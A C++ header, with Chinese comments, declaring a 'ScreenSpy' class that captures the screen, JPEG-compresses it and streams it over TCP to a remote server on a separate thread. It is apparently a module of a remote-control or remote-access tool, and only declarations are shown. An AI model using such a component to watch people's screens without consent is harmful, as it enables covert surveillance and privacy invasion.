/*
 *
 *  Author: sumkee911@gmail.com
 *  Date: 21-12-2016
 *  Brief: 从客户端截取屏幕，然后用JEPG压缩它，最后发给服务端，形成一个动态画面。
 *
 */


#ifndef SCREENSPY_H
#define SCREENSPY_H

#include "tcpsocket.h"
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <tchar.h>

// 加入jpeg压缩库头文件
extern "C" {
#include "jpeg/jpeglib.h"
#include "jpeg/jmorecfg.h"
#include "jpeg/jconfig.h"
}

class ScreenSpy
{
public:
    ScreenSpy();
    ~ScreenSpy();

    // 屏幕处理函数
    static bool captureScreen(std::vector<unsigned char> &bmpData);
    static unsigned int convertToJpgData(const std::vector<unsigned char> &bmpData,
                                 std::vector<unsigned char> &jpgData);

    // 数据头
    typedef struct {
        unsigned int len;    // jpg文件大小
    } ScreenSpyHeader;

    // 这个类的入口函数，是从另一个线程开启。
    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI threadProc(LPVOID args);

    // 连接到服务端指定的端口给它发送屏幕截图
    static void startScreenSpy(std::string domain, int port);
    static bool sendScreenData(TcpSocket *sock, std::vector<unsigned char> &jpg, unsigned int len);
};

#endif // SCREENSPY_H
